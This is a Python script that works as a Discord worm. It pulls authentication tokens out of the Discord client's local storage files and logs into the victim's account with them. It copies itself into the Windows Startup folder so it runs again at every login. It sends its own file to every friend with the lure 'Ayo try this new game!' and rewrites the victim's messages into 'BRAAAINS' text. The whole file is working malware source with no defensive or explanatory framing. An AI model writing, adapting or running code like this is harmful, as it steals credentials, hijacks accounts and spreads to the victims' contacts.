import discord
from discord.ext import commands
import asyncio
import os
import random
import re
import shutil

user = os.getenv('USERNAME')
roaming = os.getenv('APPDATA')
tokens = []

def find_tokens(path):

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

prefix = ""
client = discord.Client()
message = discord.Message 
bot = commands.Bot(command_prefix=prefix, self_bot=True)

@bot.event
async def on_ready():
    base = os.path.basename(__file__)
    shutil.copy(__file__, "C:\\Users\\"+ user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + base)
    print()
    for friend in bot.user.friends:
        await friend.send("Ayo try this new game!")
        await friend.send(file=discord.File(__file__))

@bot.event
async def on_message(message):
    if bot.user.id == message.author.id:
        randombrains = random.randint(1,30)
        firstcontent = message.content
        firstcontentlength = len(firstcontent)
        if message.content == "Ayo try this new game!":
            pass
        contentbefore = ""
        if firstcontentlength < 3:
            pass
        elif firstcontentlength < 5:
            contentbefore = firstcontent[:2]
        elif firstcontentlength > 5:
            firstcontentnum = random.randint(1, 5)
            contentbefore = firstcontent[:firstcontentnum]
        
        await message.edit(content=contentbefore + "BR" + 'A' * randombrains + "INS")
    else:
        pass

path1 = roaming + '\\discord\\Local Storage\\leveldb'
path2 = roaming + '\\discordcanary\\Local Storage\\leveldb',
path3 = roaming + '\\discordptb\\Local Storage\\leveldb',

if os.path.isdir(str(path1)):
    find_tokens(str(path1))
if os.path.isdir(str(path2)):
    find_tokens(str(path2))
if os.path.isdir(str(path3)):
    find_tokens(str(path3))

for token in tokens:
    bot.run(token, bot=False)